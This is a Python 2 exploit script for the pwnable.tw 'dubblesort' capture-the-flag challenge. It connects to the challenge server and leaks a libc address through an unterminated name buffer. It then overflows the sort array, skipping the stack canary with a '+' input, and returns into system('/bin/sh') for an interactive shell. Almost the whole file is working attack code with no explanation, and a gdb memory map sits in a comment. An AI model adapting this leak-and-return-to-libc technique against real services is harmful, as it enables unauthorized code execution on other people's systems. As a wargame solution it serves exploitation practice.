import telnetlib
from struct import pack,unpack

#HOST="localhost"
#port = 1337
HOST="chall.pwnable.tw"
port=10101 

system  = 0x3a940
off = 0x1b0000
binsh = 0x158e8b

'''
0x56555000 0x56556000 r-xp	/home/r00t/Desktop/dubblesort
0x56556000 0x56557000 r--p	/home/r00t/Desktop/dubblesort
0x56557000 0x56558000 rw-p	/home/r00t/Desktop/dubblesort
0xf7e02000 0xf7e03000 rw-p	mapped
0xf7e03000 0xf7fb3000 r-xp	/lib/i386-linux-gnu/libc-2.23.so
0xf7fb3000 0xf7fb5000 r--p	/lib/i386-linux-gnu/libc-2.23.so
0xf7fb5000 0xf7fb6000 rw-p	/lib/i386-linux-gnu/libc-2.23.so
0xf7fb6000 0xf7fb9000 rw-p	mapped
0xf7fd3000 0xf7fd4000 rw-p	mapped
0xf7fd4000 0xf7fd7000 r--p	[vvar]
0xf7fd7000 0xf7fd9000 r-xp	[vdso]
0xf7fd9000 0xf7ffc000 r-xp	/lib/i386-linux-gnu/ld-2.23.so
0xf7ffc000 0xf7ffd000 r--p	/lib/i386-linux-gnu/ld-2.23.so
0xf7ffd000 0xf7ffe000 rw-p	/lib/i386-linux-gnu/ld-2.23.so
0xfffdd000 0xffffe000 rw-p	[stack]
gdb-peda$ info sharedlibrary 
From        To          Syms Read   Shared Object Library
0xf7fd9860  0xf7ff277d  Yes (*)     /lib/ld-linux.so.2
0xf7e1a750  0xf7f4621d  Yes (*)     /lib/i386-linux-gnu/libc.so.6

'''

def p(data) :
        return pack("<Q",data)

def up(data) :
        return unpack("<Q",data)
		

def p32(data) : 
	return pack("<I",data)

def up32(data) : 
	return pack("<I",data)


t = telnetlib.Telnet(HOST,port)
print t.read_until("name :")


t.write("A"*24+"\n")
leak = t.read_until("sort :")
leak = leak.strip().split("A"*24)[1].split(",")[0]
leak = int("0x"+leak[1:4][::-1].ljust(4,"\x00").encode("hex"),16)
libc_base =  leak - off
system = libc_base + system
binsh = libc_base + binsh

print "libc base is at",hex(libc_base)
print "system is tat ",hex(system)
print "/bin/sh is tat ",hex(binsh)

t.write("35\n")

for i in range(24) : 
	print t.read_until("number :")
	t.write(str(i)+"\n")

print t.read_until("number :")
t.write("+\n")

for i in range(9) :
	print t.read_until("number :")
	t.write(str(system)+"\n")

for i in range(1) : 
	print t.read_until("number :")
	t.write(str(binsh)+"\n")

t.interact()
print t.read_all()
#t.interact()
